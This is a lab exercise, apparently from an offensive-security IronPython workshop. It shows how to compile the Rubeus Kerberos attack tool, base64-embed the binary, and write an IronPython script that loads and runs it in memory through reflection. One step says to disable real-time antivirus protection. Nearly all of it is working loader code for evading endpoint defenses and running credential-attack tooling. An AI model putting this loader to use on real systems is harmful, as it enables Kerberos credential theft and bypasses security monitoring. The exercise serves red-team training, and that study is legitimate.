# Exercise 7: Loading and Executing a .NET Assembly from Base64 in IronPython

## Pull, Modify, and Compile Rubeus
1. If not using the provided range, download [Rubeus](https://github.com/GhostPack/Rubeus.git)
2. Locate the Visual Studio shortcut on your desktop or find it from the Start menu and open it.
3. Open the Rubeus Solution: `Click on File > Open > Project/Solution`
4. Locate the Main Method in Rubeus/Program.cs, which is named `public static void Main(string[] args)`.
5. Change the private keyword to public to make the method publicly accessible:
csharp
```
public static void Main(string[] args)
```
6. Navigate to the top menu and click `Build > Build Solution`.
7. Copy Rubeus.exe to `C:\Program Files\IronPython 3.4`

## Converting to Base64
1. From `C:\Program Files\IronPython 3.4`, open a notepad named `file_to_base64.py`.
2. Write a Python function to convert a file into its base64 representation.

```python
import base64

def file_to_base64(file_path, output_file_path):
    with open(file_path, 'rb') as file:
        base64_encoded = base64.b64encode(file.read()).decode('utf-8')
        
    with open(output_file_path, 'w') as out_file:
        out_file.write(base64_encoded)

file_to_base64('Rubeus.exe', 'output_base64.txt')
```

3. Execute the function with the path to your .NET assembly.

```powershell
.\ipy.exe .\file_to_base64.py
```

4. Copy the printed base64 string for the next task.

![Alt text](image.png)

5. The file is also located [here](./output_base64.txt).

## Creating the Function
Now we are going to create the IronPython function to load the assembly.

1. Open a new Notepad and name as `IronRubeus.py`
2. Import the required IronPython modules and .NET libraries.

```python
import clr
import System
import base64
import argparse
from System.Reflection import Assembly
```

3. Next, add the base64 encoded string.

```python
base64_str = "TVqQAAMAAAAEAAAA//8AALgAAA..."
```

4. Add a function to convert the base64 string to a byte array.

```python
def base64_to_bytes(base64_string):
    return System.Array[System.Byte](base64.b64decode(base64_string))
```

5. Add a function to convert a Python list to a .NET string array.

```python

# Convert a Python list to a .NET string array
def to_clr_array(py_list):
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr
```

6. Define a function to load and execute the assembly.

```python
def load_and_execute_assembly(command):
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
```

7. Use the function to load and execute the assembly.

```python
def main():
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()
```
8. Disable real-time protection to run the script.

9. Type: ` .\ipy.exe .\IronRubeus.py help` and you should receive the following output.

![image](https://github.com/BC-SECURITY/Taming-Offensive-IronPython/assets/20302208/4f2f00fd-c23d-4cb4-aca3-dcb3f4d85449)

